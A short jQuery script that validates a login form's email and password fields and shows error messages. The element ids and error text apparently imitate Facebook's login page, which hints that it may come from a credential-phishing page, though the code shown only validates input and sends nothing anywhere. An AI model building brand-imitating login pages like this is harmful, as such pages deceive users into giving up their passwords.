
$(document).ready(function () {

 
 $("#fbinfobox").hide();

    $("#fberrorbox").show();

 $("#submit").click(function () {

        var email = $("#login").val();
        var pass = $("#password1").val();


var regexp1 = /^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$/;

var checkk = /^[a-zA-Z0-9!@#$%&;:.,><?+=)\(*^%_-]{8,30}$/;
        

   if(email=="" || pass=="")
{

   $("#fberrorbox").html("<br>Please Enter Email and Password!<br><br>").show();
	return false;
}

        
      else if(!email.match(regexp1) && email!="")
	{

           $("#fberrorbox").html("Incorrect Email.<br><br>The email you entered does not belong to any account.<br><br>You can login using an username or mobile phone number associated with your account. Make sure that it is typed correctly.").show();
		return false;}





	
    });




   });